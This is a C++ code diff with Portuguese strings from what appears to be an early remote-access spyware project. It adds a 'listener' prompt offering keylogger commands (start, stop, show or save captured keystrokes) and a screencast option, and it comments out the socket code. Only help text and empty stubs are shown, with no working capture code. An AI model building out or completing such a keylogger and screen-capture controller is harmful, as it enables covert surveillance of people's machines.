@@ -48,8 +48,9 @@ int main(){
         std::cout << "\nComandos:\n";
         std::cout << "-h: indica o host (IP ou DDNS) do servidor\n" ;
         std::cout << "-p: indica a porta a ser utilizada oela conexão\n";
-        std::cout << "\nExemplo:\n";
+        std::cout << "\nUtilize:\n";
         std::cout << "listener -p <PORT>\nbuilder -h <IP> -p <PORT>\n";
+	std::cout << "Para obter ajuda\n";
 
         std::cout << "\n$: ";
         std::cin.getline(command, command_size);
@@ -174,11 +175,8 @@ int function_loader(){
         	}
         }
 
-//Depois de extrair os parametros começa a detectar os comandos do builder
+return 0;
 
-
-
-        return 0;
 }
 
 int open_listener()
@@ -207,6 +205,8 @@ int open_listener()
         return -1;
     }
 
+/*
+
     // Aguardando conexões
         std::cout << "Aguardando pelo client\n";
     if (listen(server_fd, 3) < 0) {
@@ -233,6 +233,54 @@ int open_listener()
     // Fechando o socket
     close(new_socket);
     close(server_fd);
+*/
+
+	//Caso o listener seja iniciado, o programa não fecha e segue:
+	memset(command, 0, command_size);
+	std::cout << "Listener\n";
+	std::cout << "Instruções:\nklog -h\nscreencast -h\nexit a qualquer momento para sair.\n";
+
+	while(1){
+		std::cout << "\n$listener$: ";
+		std::cin.getline(command, command_size);
+
+		if(command[0] == 'k'){
+			//Key logger
+			hifen_encontrado = false;
+			i = 0;
+			do{
+                		if(command[i] == '-'){
+				hifen_encontrado = true;
+                		}else{
+                        		++i;
+                		}
+
+                		if(i >= 100){
+                        		std::cout << "Sintaxe incorreta\n";
+        				break;
+        			}
+
+        		}while(hifen_encontrado != true);
+
+			++i;
+
+			if(command[i] == 'h'){
+				std::cout << "\nklog <start/stop>> <Parâmetros do start>\n";
+				std::cout << "--sart        Inicia o Keylogger\n";
+				std::cout << "--stop 	      Para o Keylogger\n";
+				std::cout << "-t            Mostra a input do usuário diretamente na tela do terminal\n";
+				std::cout << "-o \"nome.txt\" Grava a input capturada em um arquivo\n\n";
+			}
+
+		}else if(command[0] == 's'){
+			//ScreenCast
+
+		}else if(command[0] == 'e'){
+			exit(1);
+		}else{
+			std::cout << "Sintaxe incorreta: " << command[i];
+		}
+	}
 
         return 0;
 }
